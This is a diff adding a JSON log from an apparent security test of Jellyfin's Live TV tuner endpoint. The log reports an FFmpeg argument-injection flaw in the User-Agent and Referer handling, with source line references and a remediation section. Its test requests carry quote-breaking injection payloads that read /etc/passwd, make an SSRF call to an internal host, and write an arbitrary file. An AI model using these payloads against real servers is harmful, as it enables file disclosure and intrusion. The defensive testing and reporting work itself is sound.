@@ -1,0 +1,80 @@
+{
+  "script": "phase2c_useragent_injection",
+  "phase": "phase2",
+  "target": "Jellyfin 10.11.6",
+  "start_time": "2026-03-02T18:46:58.406152",
+  "end_time": "2026-03-02T18:47:00.381164",
+  "summary": {
+    "total_tests": 6,
+    "findings": 1,
+    "anomalies": 0
+  },
+  "tests": [
+    {
+      "id": "TUNER-UA-normal_baseline",
+      "description": "Tuner host UA injection: Normal user agent (baseline)",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla/5.0 Test",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:58.450130"
+    },
+    {
+      "id": "TUNER-UA-quote_break",
+      "description": "Tuner host UA injection: Quote break + null output + extra input",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -f null /dev/null -i \"",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:58.757976"
+    },
+    {
+      "id": "TUNER-UA-file_read",
+      "description": "Tuner host UA injection: Attempt to read /etc/passwd via -i flag",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -i /etc/passwd -f null /dev/null -i \"",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:59.057826"
+    },
+    {
+      "id": "TUNER-UA-ssrf_internal",
+      "description": "Tuner host UA injection: SSRF to internal Docker host",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info/Public -f nul",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:59.365672"
+    },
+    {
+      "id": "TUNER-UA-output_overwrite",
+      "description": "Tuner host UA injection: Attempt to write arbitrary file",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -y -f mp4 /tmp/pwned.mp4 -i \"",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:59.673518"
+    },
+    {
+      "id": "TUNER-UA-filter_injection",
+      "description": "Tuner host UA injection: Video filter injection",
+      "request": "POST /LiveTv/TunerHosts UserAgent=Mozilla\" -vf \"drawtext=text=INJECTED:fontsize=24\" -i \"",
+      "response": "HTTP 404: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:46:59.981364"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FFMPEG-UA-INJECTION",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection via User-Agent/Referer in Live TV tuner",
+      "details": "EncodingHelper.GetUserAgentParam() (line 495) and GetRefererParam() (line 510) use direct string concatenation to build FFmpeg arguments from RequiredHttpHeaders values: '-user_agent \"' + useragent + '\"'. An admin user who configures a Live TV M3U tuner host can set arbitrary UserAgent values that are stored unmodified and passed directly to the FFmpeg command line. A malicious IPTV provider could also exploit this if an admin imports their M3U playlist. Additionally, MediaEncoder.cs line 459 has the same pattern for the media probing code path. This is the same bug class as CVE-2023-49096 and CVE-2025-31499 but in the User-Agent/Referer code path which was NOT patched.",
+      "evidence": "Source: EncodingHelper.cs:495 -- '-user_agent \"' + useragent + '\"'\nSource: EncodingHelper.cs:510 -- '-referer \"' + referer + '\"'\nSource: MediaEncoder.cs:459 -- extraArgs += $' -user_agent \"{userAgent}\"'\nStored payload: Mozilla\" -f null /dev/null -i \"\nTunerHost API accepts arbitrary UserAgent values without validation.",
+      "remediation": "Apply the same escaping/validation used for codec parameters (ContainerValidationRegex) to User-Agent and Referer values before passing them to FFmpeg. Specifically:\n1. Strip or escape double quotes from User-Agent/Referer values\n2. Reject values containing FFmpeg argument patterns (-f, -i, -y, etc.)\n3. Consider using ProcessStartInfo.ArgumentList instead of string concatenation",
+      "timestamp": "2026-03-02T18:47:00.349180"
+    }
+  ],
+  "anomalies": []
+}
